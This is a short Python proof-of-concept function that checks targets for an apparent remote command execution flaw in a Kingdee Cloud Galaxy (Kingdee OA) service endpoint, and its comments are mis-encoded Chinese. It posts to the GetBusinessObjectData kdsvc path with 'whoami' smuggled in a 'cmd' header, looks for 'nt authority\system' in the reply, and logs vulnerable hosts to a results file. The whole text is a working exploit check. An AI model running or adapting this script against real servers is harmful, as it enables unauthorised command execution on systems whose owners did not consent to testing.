#ÂÆö‰πâpoc
def poc(target):
    payload = '/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc'
    url = target+payload
    headers = {
        'cmd':'whoami',
        'Content-Type':'text/json',
        'Content-Length':'15907',
        'Connection':'close',
    }
    data = '''
{"ap0":"","format":"3"}
'''
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    #ËØ∑Ê±ÇÁΩëÈ°µ
    try:
        re = requests.post(url=url,headers=headers,data=data,verify=False,proxies=proxies)
        # print(re.text)
        if re.status_code == 200 and "nt authority\system" in re.text:
            # print("200Âï¶")
            print(f'[+++]ËØ•{target}Â≠òÂú®ÈáëËù∂OA ‰∫ëÊòüÁ©∫ kdsvc ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û')
            with open('result.txt',mode='a',encoding='utf-8')as ft:
                ft.write(target+'\n')
            return True
        else:
            print(f'ËØ•{target}‰∏çÂ≠òÂú®ËØ•ÊºèÊ¥û')
            return False
    except:
        print(f'ËØ•{target}Â≠òÂú®ÈóÆÈ¢òÔºåËØ∑ÊâãÂä®ÊµãËØï')
        return False


